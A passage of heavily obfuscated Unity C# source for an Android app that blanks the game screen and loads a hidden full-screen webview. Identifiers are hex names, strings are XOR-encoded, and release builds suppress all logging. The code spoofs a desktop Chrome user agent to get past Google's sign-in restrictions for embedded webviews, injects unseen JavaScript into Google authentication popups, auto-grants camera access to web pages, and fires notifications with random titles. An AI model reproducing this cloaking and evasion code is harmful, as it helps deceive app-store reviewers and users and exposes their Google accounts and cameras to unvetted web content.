                    string _0xb568191e = _0xbdce6879.Call<string>(_0x6da9ed2f._0x22ec74ef(new byte[8] { 201, 210, 238, 201, 207, 212, 211, 218 }, 189));
                    if (!string.IsNullOrEmpty(_0xb568191e))
                    {
                        _0xe1d811f1(_0xb568191e);
                    }
                }
            }
        }
    }

    private string _0x40d0c82d = "";
    private IEnumerator _0x70c809d3(string _0xa8aa257b)
    {
        if (_0xf540acea != null && _0xf67969c4)
            yield break;
        _0xf540acea = gameObject.AddComponent<UniWebView>();
        _0xc30279c8(_0xf540acea);
        _0xd9a9e6c5(_0xf540acea);
        _0xf540acea.BackgroundColor = Color.clear;
        var _0x8fb3b106 = SceneManager.GetActiveScene().GetRootGameObjects();
        var _0xf638f476 = Camera.main;
        if (Camera.main != null)
        {
            Camera.main.cullingMask = 0;
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.black;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0xd93356b7();
        yield return new WaitForEndOfFrame();
        _0xf67969c4 = true;
        _0xfb81855f();
        _0xbecaad9c(true);
        _0x536c5b52 = false;
        _0xbbd2bc34 = false;
        _0xc0005a68.Clear();
        _0xf883fed1 = -1;
        firstLoadShown = false;
        _0xd20b4599 = false;
        _0xac6c517d = false;
        _0xf540acea.SetUserAgent("");
        _0xa1b6a2c2 = Time.realtimeSinceStartup;
        _0xf540acea.Stop();
        _0xf540acea.Load(_0xa8aa257b);
        _0xf540acea.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x6da9ed2f._0x22ec74ef(new byte[25] { 252, 208, 216, 223, 145, 230, 212, 211, 231, 216, 212, 198, 145, 248, 223, 216, 197, 216, 208, 221, 145, 226, 217, 222, 198 }, 177));
    }

    private bool OpenUrlExternally(string _0x1fb08a28)
    {
        return _0x9d74c32c(_0x1fb08a28);
    }

    private string _0xfb7edd4a()
    {
        string _0xb43fbf27 = _0x6da9ed2f._0x22ec74ef(new byte[62] { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86 }, 111);
        System.Random _0x5ef95e8c = new System.Random();
        int _0x968bb000 = _0x5ef95e8c.Next(8, 16);
        return new string (Enumerable.Repeat(_0xb43fbf27, _0x968bb000).Select(_0x93c0ec96 => _0x93c0ec96[_0x5ef95e8c.Next(_0x93c0ec96.Length)]).ToArray());
    }

    private bool _0xac6c517d = false;
    private void _0xd9a9e6c5(UniWebView _0xd68f846a)
    {
        if (_0x19b6e5f1)
            return;
        _0x19b6e5f1 = true;
        _0xd68f846a.AddUrlScheme(_0x6da9ed2f._0x22ec74ef(new byte[2] { 92, 79 }, 40));
        _0xd68f846a.AddUrlScheme(_0x6da9ed2f._0x22ec74ef(new byte[6] { 40, 47, 53, 36, 47, 53 }, 65));
        _0xd68f846a.AddUrlScheme(_0x6da9ed2f._0x22ec74ef(new byte[6] { 19, 31, 12, 21, 27, 10 }, 126));
        _0xd68f846a.OnMessageReceived += (_0x93aec831, _0xd2dac61e) =>
        {
            if (TryOpenExternalLikeChrome(_0xd2dac61e.RawMessage))
            {
                _0xbecaad9c(false);
                return;
            }
        };
        _0xd68f846a.RegisterShouldHandleRequest(_0xb857cc5c =>
        {
            string _0x6b3ece56 = _0xb857cc5c != null ? _0xb857cc5c.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x6b3ece56))
                return true;
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[21] { 158, 165, 162, 184, 161, 169, 133, 172, 163, 169, 161, 168, 159, 168, 188, 184, 168, 190, 185, 247, 237 }, 205) + _0x6b3ece56);
            if (TryOpenExternalLikeChrome(_0x6b3ece56))
            {
                _0xbecaad9c(false);
                return false;
            }

            if (_0xb857cc5c != null && _0xb857cc5c.IsMainFrame && IsGoogleAuthFlowUrl(_0x6b3ece56) && !_0xbbd2bc34)
            {
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[62] { 79, 99, 107, 108, 34, 85, 103, 96, 84, 107, 103, 117, 34, 102, 103, 118, 103, 97, 118, 103, 102, 34, 69, 109, 109, 101, 110, 103, 34, 99, 119, 118, 106, 34, 87, 80, 78, 34, 47, 60, 34, 112, 103, 110, 109, 99, 102, 34, 117, 107, 118, 106, 34, 69, 109, 109, 101, 110, 103, 34, 87, 67 }, 2));
                _0xbbd2bc34 = true;
                _0xbecaad9c(true);
                _0xf540acea.SetUserAgent(_0xb53cbb25());
                _0xf540acea.Load(_0x6b3ece56);
                return false;
            }

            return true;
        });
        _0xd68f846a.OnLoadingErrorReceived += (_0x93aec831, _0xe242f1a0, _0xd2dac61e, _0xf2542b31) =>
        {
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[25] { 98, 78, 70, 65, 15, 120, 74, 77, 121, 70, 74, 88, 15, 106, 93, 93, 64, 93, 21, 15, 76, 64, 75, 74, 18 }, 47) + _0xe242f1a0 + _0x6da9ed2f._0x22ec74ef(new byte[9] { 185, 244, 252, 234, 234, 248, 254, 252, 164 }, 153) + _0xd2dac61e);
            string _0xd4da8877 = GetFailingUrl(_0xf2542b31);
            if (string.IsNullOrEmpty(_0xd4da8877) || IsAboutBlank(_0xd4da8877))
                return;
            _ = _0x750d75cc(_0x6da9ed2f._0x22ec74ef(new byte[8] { 25, 24, 49, 11, 28, 28, 1, 28 }, 110));
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[45] { 128, 172, 164, 163, 237, 154, 168, 175, 155, 164, 168, 186, 237, 171, 172, 164, 161, 164, 163, 170, 237, 152, 159, 129, 237, 224, 243, 237, 162, 189, 168, 163, 237, 168, 181, 185, 168, 191, 163, 172, 161, 161, 180, 247, 237 }, 205) + _0xd4da8877);
            StopCurrentFailedLoad(_0x93aec831);
            _0x725e3d80(_0xd4da8877);
        };
        _0xd68f846a.OnPageStarted += (_0x93aec831, _0x870ad0fa) =>
        {
            _0x0fd7820a = 0;
            if (_0x536c5b52 && IsAboutBlank(_0x870ad0fa))
            {
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[27] { 73, 107, 124, 110, 120, 107, 116, 57, 120, 123, 118, 108, 109, 35, 123, 117, 120, 119, 114, 57, 106, 109, 120, 107, 109, 124, 125 }, 25));
                return;
            }

            WLog(_0x6da9ed2f._0x22ec74ef(new byte[29] { 99, 79, 71, 64, 14, 121, 75, 76, 120, 71, 75, 89, 14, 97, 64, 126, 79, 73, 75, 125, 90, 79, 92, 90, 75, 74, 20, 14, 5 }, 46) + (Time.realtimeSinceStartup - _0xa1b6a2c2).ToString(_0x6da9ed2f._0x22ec74ef(new byte[5] { 132, 154, 132, 132, 132 }, 180)) + _0x6da9ed2f._0x22ec74ef(new byte[2] { 40, 123 }, 91) + _0x870ad0fa);
            if (TryOpenExternalLikeChrome(_0x870ad0fa))
            {
                StopCurrentFailedLoad(_0x93aec831);
                return;
            }

            if (ContainsIgnoreCase(_0x870ad0fa, _0x6da9ed2f._0x22ec74ef(new byte[8] { 80, 93, 93, 85, 26, 85, 68, 68 }, 52)) || ContainsIgnoreCase(_0x870ad0fa, _0x6da9ed2f._0x22ec74ef(new byte[15] { 82, 67, 91, 12, 85, 75, 70, 69, 71, 86, 12, 64, 78, 77, 69 }, 34)) || _0x870ad0fa.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[25] { 83, 79, 79, 75, 72, 1, 20, 20, 89, 75, 92, 87, 84, 89, 90, 87, 93, 90, 77, 21, 87, 82, 77, 94, 20 }, 59), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x93aec831);
                OpenUrlExternally(_0x870ad0fa);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x870ad0fa))
            {
                _0xbecaad9c(true);
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[41] { 131, 171, 171, 163, 168, 161, 228, 165, 177, 176, 172, 228, 162, 168, 171, 179, 228, 160, 161, 176, 161, 167, 176, 161, 160, 228, 233, 250, 228, 175, 161, 161, 180, 228, 178, 173, 183, 173, 166, 168, 161 }, 196));
                return;
            }

            _0xd20b4599 = true;
            _0xbecaad9c(true);
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[43] { 159, 173, 170, 158, 161, 173, 191, 232, 164, 167, 169, 172, 161, 166, 175, 231, 186, 173, 172, 161, 186, 173, 171, 188, 161, 166, 175, 232, 229, 246, 232, 163, 173, 173, 184, 232, 190, 161, 187, 161, 170, 164, 173 }, 200));
        };
        _0xd68f846a.OnPageCommitted += (_0x93aec831, _0x870ad0fa) =>
        {
            if (_0x536c5b52 && IsAboutBlank(_0x870ad0fa))
                return;
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[31] { 240, 220, 212, 211, 157, 234, 216, 223, 235, 212, 216, 202, 157, 242, 211, 237, 220, 218, 216, 254, 210, 208, 208, 212, 201, 201, 216, 217, 135, 157, 150 }, 189) + (Time.realtimeSinceStartup - _0xa1b6a2c2).ToString(_0x6da9ed2f._0x22ec74ef(new byte[5] { 221, 195, 221, 221, 221 }, 237)) + _0x6da9ed2f._0x22ec74ef(new byte[2] { 235, 184 }, 152) + _0x870ad0fa);
            if (!firstLoadShown && IsHttpUrl(_0x870ad0fa))
            {
                firstLoadShown = true;
                _0xd20b4599 = false;
                _0xbecaad9c(false);
                _0xd93356b7();
                _0x93aec831.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x750d75cc(_0x6da9ed2f._0x22ec74ef(new byte[9] { 222, 223, 246, 198, 217, 204, 199, 204, 205 }, 169));
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[39] { 57, 21, 29, 26, 84, 35, 17, 22, 34, 29, 17, 3, 84, 7, 28, 27, 3, 26, 84, 27, 26, 84, 23, 27, 25, 25, 29, 0, 0, 17, 16, 84, 23, 27, 26, 0, 17, 26, 0 }, 116));
            }
        };
        _0xd68f846a.OnPageProgressChanged += (_0x93aec831, _0x7174c883) =>
        {
            if (_0x536c5b52)
                return;
            if (!firstLoadShown && _0x7174c883 >= 0.65f)
            {
                firstLoadShown = true;
                _0xd20b4599 = false;
                _0xbecaad9c(false);
                _0xd93356b7();
                _0x93aec831.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x750d75cc(_0x6da9ed2f._0x22ec74ef(new byte[9] { 22, 23, 62, 14, 17, 4, 15, 4, 5 }, 97));
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[32] { 227, 207, 199, 192, 142, 249, 203, 204, 248, 199, 203, 217, 142, 221, 198, 193, 217, 192, 142, 204, 215, 142, 222, 220, 193, 201, 220, 203, 221, 221, 148, 142 }, 174) + _0x7174c883);
            }
        };
        _0xd68f846a.OnPageFinished += (_0x93aec831, _0xe242f1a0, _0x870ad0fa) =>
        {
            if (_0x536c5b52 && IsAboutBlank(_0x870ad0fa))
            {
                _0x536c5b52 = false;
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[28] { 238, 204, 219, 201, 223, 204, 211, 158, 223, 220, 209, 203, 202, 132, 220, 210, 223, 208, 213, 158, 216, 215, 208, 215, 205, 214, 219, 218 }, 190));
                return;
            }

            WLog(_0x6da9ed2f._0x22ec74ef(new byte[24] { 31, 51, 59, 60, 114, 5, 55, 48, 4, 59, 55, 37, 114, 20, 59, 60, 59, 33, 58, 55, 54, 104, 114, 121 }, 82) + (Time.realtimeSinceStartup - _0xa1b6a2c2).ToString(_0x6da9ed2f._0x22ec74ef(new byte[5] { 147, 141, 147, 147, 147 }, 163)) + _0x6da9ed2f._0x22ec74ef(new byte[7] { 134, 213, 150, 154, 145, 144, 200 }, 245) + _0xe242f1a0 + _0x6da9ed2f._0x22ec74ef(new byte[5] { 205, 152, 159, 129, 208 }, 237) + _0x870ad0fa);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0xd20b4599 = false;
                _0xbecaad9c(false);
                _0xd93356b7();
                _0x93aec831.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x750d75cc(_0x6da9ed2f._0x22ec74ef(new byte[9] { 252, 253, 212, 228, 251, 238, 229, 238, 239 }, 139));
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[33] { 195, 239, 231, 224, 174, 217, 235, 236, 216, 231, 235, 249, 174, 232, 231, 252, 253, 250, 174, 226, 225, 239, 234, 174, 237, 225, 227, 254, 226, 235, 250, 235, 234 }, 142));
            }
            else if (_0xd20b4599)
            {
                _0xd20b4599 = false;
                _0xbecaad9c(false);
                _0x93aec831.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[40] { 181, 153, 145, 150, 216, 175, 157, 154, 174, 145, 157, 143, 216, 171, 144, 151, 143, 216, 153, 158, 140, 157, 138, 216, 148, 151, 153, 156, 145, 150, 159, 216, 158, 145, 150, 145, 139, 144, 157, 156 }, 248));
            }
            else
            {
                _0xbecaad9c(false);
            }

            if (_0xbbd2bc34 && !IsGoogleAuthFlowUrl(_0x870ad0fa) && !IsGoogleAuthFlowUrl(_0x870ad0fa))
            {
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[48] { 224, 200, 200, 192, 203, 194, 135, 198, 210, 211, 207, 135, 212, 194, 194, 202, 212, 135, 193, 206, 201, 206, 212, 207, 194, 195, 135, 138, 153, 135, 213, 194, 212, 211, 200, 213, 194, 135, 195, 194, 193, 198, 210, 203, 211, 135, 242, 230 }, 167));
                _0xbbd2bc34 = false;
                _0xf540acea.SetUserAgent("");
            }
        };
        _0xd68f846a.OnShouldClose += _0x93aec831 =>
        {
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[41] { 118, 121, 72, 94, 89, 112, 13, 96, 76, 68, 67, 13, 122, 72, 79, 123, 68, 72, 90, 13, 98, 67, 126, 69, 66, 88, 65, 73, 110, 65, 66, 94, 72, 13, 68, 67, 91, 66, 70, 72, 73 }, 45));
            _0xdb23701e();
            return false;
        };
        _0xd68f846a.SetPopupPageEventEnabled(true);
        bool _0x8f231b34 = false;
        bool _0x2c81957d = false;
        _0xd68f846a.OnMultipleWindowOpened += (_0x93aec831, _0x4741a9b9) =>
        {
            _0x93aec831.ScrollTo(0, 0, false);
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[43] { 108, 99, 82, 68, 67, 106, 23, 122, 86, 94, 89, 23, 96, 82, 85, 97, 94, 82, 64, 23, 122, 66, 91, 67, 94, 71, 91, 82, 96, 94, 89, 83, 88, 64, 23, 120, 71, 82, 89, 82, 83, 13, 23 }, 55) + _0x4741a9b9);
            var _0xe46be8df = _0xd68f846a.GetPopupWindow(_0x4741a9b9);
            if (_0xe46be8df == null)
                return;
            _0xc0005a68.Add(_0xe46be8df);
            Debug.Log($"[Test] Popup ID: {_0xe46be8df.Id}");
            _0xe46be8df.OnPageStarted += (_0x65b30ef6, _0x870ad0fa) =>
            {
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[36] { 130, 141, 188, 170, 173, 132, 249, 137, 182, 169, 172, 169, 249, 142, 188, 187, 143, 176, 188, 174, 249, 150, 183, 137, 184, 190, 188, 138, 173, 184, 171, 173, 188, 189, 227, 249 }, 217) + _0x870ad0fa);
                _0x0fd7820a = 0;
                if (string.IsNullOrEmpty(_0x870ad0fa) || IsAboutBlank(_0x870ad0fa))
                    return;
                if (IsGoogleAuthFlowUrl(_0x870ad0fa))
                {
                    WLog(_0x6da9ed2f._0x22ec74ef(new byte[57] { 89, 86, 103, 113, 118, 95, 34, 82, 109, 114, 119, 114, 34, 69, 109, 109, 101, 110, 103, 34, 99, 119, 118, 106, 34, 100, 110, 109, 117, 34, 47, 60, 34, 113, 114, 109, 109, 100, 34, 69, 109, 109, 101, 110, 103, 34, 65, 106, 112, 109, 111, 103, 34, 87, 67, 56, 34 }, 2) + _0x870ad0fa);
                    _0x8f231b34 = false;
                    _0x4999ebd0();
                    if (_0x65b30ef6 != null && _0x65b30ef6.IsAlive)
                        _0x65b30ef6.EvaluateJavaScript(_0x05f1cb43());
                    return;
                }

                if (_0xf540acea == null)
                    return;
                if (!_0x8f231b34)
                {
                    _0x8f231b34 = true;
                    _0xf540acea.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x6da9ed2f._0x22ec74ef(new byte[39] { 234, 229, 212, 194, 197, 236, 145, 225, 222, 193, 196, 193, 145, 208, 193, 193, 221, 200, 145, 230, 216, 223, 213, 222, 198, 194, 145, 213, 212, 194, 218, 197, 222, 193, 145, 228, 240, 139, 145 }, 177) + _0x870ad0fa);
                }

                if (_0x65b30ef6 != null && _0x65b30ef6.IsAlive)
                    _0x65b30ef6.EvaluateJavaScript(_0x0923cf4e());
                if (!_0x2c81957d && _0x65b30ef6 != null && _0x65b30ef6.IsAlive && IsHttpUrl(_0x870ad0fa))
                {
                    _0x2c81957d = true;
                }
            };
            _0xe46be8df.OnPageFinished += (_0x65b30ef6, _0xf2542b31) =>
            {
                string _0xd62c17bc = _0xf2542b31 != null ? _0xf2542b31.data : string.Empty;
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[35] { 26, 21, 36, 50, 53, 28, 97, 17, 46, 49, 52, 49, 97, 22, 36, 35, 23, 40, 36, 54, 97, 7, 40, 47, 40, 50, 41, 36, 37, 123, 97, 52, 51, 45, 124 }, 65) + _0xd62c17bc);
                if (_0x65b30ef6 == null || !_0x65b30ef6.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0xd62c17bc))
                {
                    _0x4999ebd0();
                    _0x65b30ef6.EvaluateJavaScript(_0x05f1cb43());
                    return;
                }

                if (!_0x8f231b34)
                    return;
                _0x65b30ef6.EvaluateJavaScript(_0x0923cf4e());
            };
        };
        _0xd68f846a.OnMultipleWindowClosed += (_0x93aec831, _0x4741a9b9) =>
        {
            _0xc0005a68.RemoveAll(_0x89c60ef0 => _0x89c60ef0 == null || _0x89c60ef0.Id == _0x4741a9b9 || !_0x89c60ef0.IsAlive);
            _0xbecaad9c(false);
            if (_0xc0005a68.Count == 0 && _0xf540acea != null)
            {
                _0x8f231b34 = false;
                _0x2c81957d = false;
                _0xf303fae1();
            }

            WLog(_0x6da9ed2f._0x22ec74ef(new byte[43] { 42, 37, 20, 2, 5, 44, 81, 60, 16, 24, 31, 81, 38, 20, 19, 39, 24, 20, 6, 81, 60, 4, 29, 5, 24, 1, 29, 20, 38, 24, 31, 21, 30, 6, 81, 50, 29, 30, 2, 20, 21, 75, 81 }, 113) + _0x4741a9b9);
        };
        _0xd68f846a.RegisterOnRequestMediaCapturePermission(_0xb857cc5c =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    internal bool isApplicationPause = false;
    private readonly List<UniWebViewPopup> _0xc0005a68 = new List<UniWebViewPopup>();
    private float _0xa1b6a2c2 = 0f;
    private void _0xc30279c8(UniWebView _0xe98d8b1c)
    {
        _0xe98d8b1c.BackgroundColor = Color.clear;
        _0xe98d8b1c.SetSupportMultipleWindows(true, true);
        _0xe98d8b1c.SetBackButtonEnabled(false);
        _0xf540acea.SetUserAgent(_0xb53cbb25());
    }

    private void Awake()
    {
        if (_0x318df0ea != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x318df0ea = gameObject.GetComponent<_0x3858c973>();
        DontDestroyOnLoad(gameObject);
        _0xa8d3ed49 = _0x009c2d65 = _0xdb6e618e = "";
        _0xfacbd605 = "";
        _0xf67969c4 = false;
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x1b48520f();
    }

    private bool _0xccafa5a8(string _0x6c77f953)
    {
        try
        {
            using (var _0xcf166c04 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[30] { 89, 85, 87, 20, 79, 84, 83, 78, 67, 9, 94, 20, 74, 86, 91, 67, 95, 72, 20, 111, 84, 83, 78, 67, 106, 86, 91, 67, 95, 72 }, 58)))
            using (var _0xa9b7d720 = _0xcf166c04.GetStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[15] { 29, 11, 12, 12, 27, 16, 10, 63, 29, 10, 23, 8, 23, 10, 7 }, 126)))
            using (var _0x61175085 = _0xa9b7d720.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[17] { 233, 235, 250, 222, 239, 237, 229, 239, 233, 235, 195, 239, 224, 239, 233, 235, 252 }, 142)))
            using (var _0xfc35c53f = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[22] { 183, 184, 178, 164, 185, 191, 178, 248, 181, 185, 184, 162, 179, 184, 162, 248, 159, 184, 162, 179, 184, 162 }, 214)))
            using (var _0x4f0fc189 = _0xfc35c53f.CallStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[8] { 8, 25, 10, 11, 29, 45, 10, 17 }, 120), _0x6c77f953, 1))
            {
                string _0x50da3c48 = _0x4f0fc189.Call<string>(_0x6da9ed2f._0x22ec74ef(new byte[14] { 94, 92, 77, 106, 77, 75, 80, 87, 94, 124, 65, 77, 75, 88 }, 57), _0x6da9ed2f._0x22ec74ef(new byte[20] { 77, 93, 64, 88, 92, 74, 93, 112, 73, 78, 67, 67, 77, 78, 76, 68, 112, 90, 93, 67 }, 47));
                string _0x31b71886 = _0x4f0fc189.Call<string>(_0x6da9ed2f._0x22ec74ef(new byte[10] { 15, 13, 28, 56, 9, 11, 3, 9, 15, 13 }, 104));
                _0x4f0fc189.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[11] { 52, 49, 49, 22, 52, 33, 48, 50, 58, 39, 44 }, 85), _0x6da9ed2f._0x22ec74ef(new byte[33] { 190, 177, 187, 173, 176, 182, 187, 241, 182, 177, 171, 186, 177, 171, 241, 188, 190, 171, 186, 184, 176, 173, 166, 241, 157, 141, 144, 136, 140, 158, 157, 147, 154 }, 223));
                _0x4f0fc189.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[11] { 40, 63, 55, 53, 44, 63, 31, 34, 46, 40, 59 }, 90), _0x6da9ed2f._0x22ec74ef(new byte[20] { 99, 115, 110, 118, 114, 100, 115, 94, 103, 96, 109, 109, 99, 96, 98, 106, 94, 116, 115, 109 }, 1));
                if (_0x4f0fc189.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[15] { 177, 166, 176, 172, 175, 181, 166, 130, 160, 183, 170, 181, 170, 183, 186 }, 195), _0x61175085) != null)
                {
                    WLog(_0x6da9ed2f._0x22ec74ef(new byte[24] { 149, 190, 164, 185, 187, 179, 154, 191, 189, 179, 246, 185, 166, 179, 184, 246, 191, 184, 162, 179, 184, 162, 236, 246 }, 214) + _0x6c77f953);
                    _0x4f0fc189.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[8] { 28, 25, 25, 59, 17, 28, 26, 14 }, 125), 0x10000000);
                    _0xa9b7d720.Call(_0x6da9ed2f._0x22ec74ef(new byte[13] { 191, 184, 173, 190, 184, 141, 175, 184, 165, 186, 165, 184, 181 }, 204), _0x4f0fc189);
                    return true;
                }

                if (_0x8838961f(_0x31b71886))
                    return true;
                if (!string.IsNullOrEmpty(_0x50da3c48))
                {
                    WLog(_0x6da9ed2f._0x22ec74ef(new byte[28] { 93, 118, 108, 113, 115, 123, 82, 119, 117, 123, 62, 119, 112, 106, 123, 112, 106, 62, 120, 127, 114, 114, 124, 127, 125, 117, 36, 62 }, 30) + _0x50da3c48);
                    if (_0x8a3d01a5(_0x50da3c48))
                        return _0x1514241f(_0x50da3c48, _0x31b71886);
                    return _0x9d74c32c(_0x50da3c48);
                }

                WLog(_0x6da9ed2f._0x22ec74ef(new byte[30] { 99, 72, 82, 79, 77, 69, 108, 73, 75, 69, 0, 73, 78, 84, 69, 78, 84, 0, 78, 79, 0, 72, 65, 78, 68, 76, 69, 82, 26, 0 }, 32) + _0x6c77f953);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[26] { 0, 43, 49, 44, 46, 38, 15, 42, 40, 38, 99, 42, 45, 55, 38, 45, 55, 99, 37, 34, 42, 47, 38, 39, 121, 99 }, 67) + e.Message);
            return true;
        }
    }

    private bool TryOpenExternalLikeChrome(string _0x341588bf)
    {
        if (string.IsNullOrEmpty(_0x341588bf))
            return false;
        if (_0x341588bf.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[9] { 178, 181, 175, 190, 181, 175, 225, 244, 244 }, 219), StringComparison.OrdinalIgnoreCase))
            return _0xccafa5a8(_0x341588bf);
        if (_0x8a3d01a5(_0x341588bf))
            return _0x1514241f(_0x341588bf, null);
        if (!_0x341588bf.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[7] { 156, 128, 128, 132, 206, 219, 219 }, 244), StringComparison.OrdinalIgnoreCase) && !_0x341588bf.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[8] { 16, 12, 12, 8, 11, 66, 87, 87 }, 120), StringComparison.OrdinalIgnoreCase) && !_0x341588bf.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[11] { 191, 188, 177, 171, 170, 228, 188, 178, 191, 176, 181 }, 222), StringComparison.OrdinalIgnoreCase))
        {
            return _0x9d74c32c(_0x341588bf);
        }

        return false;
    }

    private bool _0x97baa1bb()
    {
        var _0xb4539451 = Keyboard.current;
        return _0xb4539451 != null && _0xb4539451.escapeKey.wasPressedThisFrame;
    }

    private static readonly string WindowsDesktopUserAgent = _0x6da9ed2f._0x22ec74ef(new byte[111] { 193, 227, 246, 229, 224, 224, 237, 163, 185, 162, 188, 172, 164, 219, 229, 226, 232, 227, 251, 255, 172, 194, 216, 172, 189, 188, 162, 188, 183, 172, 219, 229, 226, 186, 184, 183, 172, 244, 186, 184, 165, 172, 205, 252, 252, 224, 233, 219, 233, 238, 199, 229, 248, 163, 185, 191, 187, 162, 191, 186, 172, 164, 199, 196, 216, 193, 192, 160, 172, 224, 229, 231, 233, 172, 203, 233, 239, 231, 227, 165, 172, 207, 228, 254, 227, 225, 233, 163, 189, 190, 188, 162, 188, 162, 188, 162, 188, 172, 223, 237, 234, 237, 254, 229, 163, 185, 191, 187, 162, 191, 186 }, 140);
    private Canvas _0x9dcb344b()
    {
        if (_0x5705c2fe != null)
            return _0x5705c2fe;
        var _0x02133efb = gameObject.GetComponentInChildren<Canvas>();
        if (_0x02133efb == null)
        {
            var _0x219c543e = new GameObject(_0x6da9ed2f._0x22ec74ef(new byte[6] { 221, 255, 240, 232, 255, 237 }, 158), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x02133efb = _0x219c543e.GetComponent<Canvas>();
            _0x02133efb.transform.SetParent(transform, false);
            _0x02133efb.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x5705c2fe = _0x02133efb;
        return _0x5705c2fe;
    }

    // WEB VIEW LOGIC END
    internal void _0x091e47ca()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0xbc8abade = new AndroidNotificationChannel
        {
            Id = _0x6da9ed2f._0x22ec74ef(new byte[15] { 223, 222, 221, 218, 206, 215, 207, 228, 216, 211, 218, 213, 213, 222, 215 }, 187),
            Name = _0x6da9ed2f._0x22ec74ef(new byte[15] { 246, 215, 212, 211, 199, 222, 198, 146, 241, 218, 211, 220, 220, 215, 222 }, 178),
            Importance = Importance.High,
            Description = _0x6da9ed2f._0x22ec74ef(new byte[21] { 64, 98, 105, 98, 117, 102, 107, 39, 105, 104, 115, 110, 97, 110, 100, 102, 115, 110, 104, 105, 116 }, 7)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0xbc8abade);
        // Build notification
        var _0xf0e8aa43 = new AndroidNotification
        {
            Title = _0x6af161b0[UnityEngine.Random.Range(0, _0x6af161b0.Length)],
            Text = _0x6da9ed2f._0x22ec74ef(new byte[21] { 168, 155, 140, 201, 144, 134, 156, 201, 154, 156, 155, 140, 201, 157, 134, 201, 140, 145, 128, 157, 214 }, 233),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0xf0e8aa43, _0x6da9ed2f._0x22ec74ef(new byte[15] { 4, 5, 6, 1, 21, 12, 20, 63, 3, 8, 1, 14, 14, 5, 12 }, 96));
    }

    private void _0xfb81855f()
    {
        if (_0x631a365e != null)
            return;
        var _0xa033f0d0 = _0x9dcb344b();
        _0x631a365e = new GameObject(_0x6da9ed2f._0x22ec74ef(new byte[14] { 149, 167, 160, 148, 171, 167, 181, 145, 178, 171, 172, 172, 167, 176 }, 194), typeof(RectTransform), typeof(Text));
        _0x43a38e59 = _0x631a365e.GetComponent<RectTransform>();
        _0x43a38e59.SetParent(_0xa033f0d0.transform, false);
        _0x43a38e59.anchorMin = new Vector2(0.5f, 0.5f);
        _0x43a38e59.anchorMax = new Vector2(0.5f, 0.5f);
        _0x43a38e59.pivot = new Vector2(0.5f, 0.5f);
